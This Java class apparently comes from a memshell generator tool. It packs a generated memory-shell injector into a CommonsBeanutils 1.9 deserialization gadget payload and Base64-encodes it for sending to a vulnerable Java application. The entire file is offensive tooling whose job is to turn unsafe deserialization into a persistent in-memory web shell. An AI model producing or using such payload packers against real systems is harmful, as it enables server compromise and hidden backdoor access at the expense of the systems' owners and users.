package com.reajason.javaweb.memshell.packer.deserialize.java;

import com.reajason.javaweb.deserialize.DeserializeConfig;
import com.reajason.javaweb.deserialize.DeserializeGenerator;
import com.reajason.javaweb.deserialize.PayloadType;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;
import lombok.SneakyThrows;
import org.apache.commons.codec.binary.Base64;

/**
 * @author ReaJason
 * @since 2025/2/17
 */
public class CommonsBeanutils19Packer implements Packer {

    @Override
    @SneakyThrows
    public String pack(GenerateResult generateResult) {
        DeserializeConfig deserializeConfig = new DeserializeConfig();
        deserializeConfig.setPayloadType(PayloadType.CommonsBeanutils19);
        return Base64.encodeBase64String(DeserializeGenerator.generate(generateResult.getInjectorBytes(), deserializeConfig));
    }
}
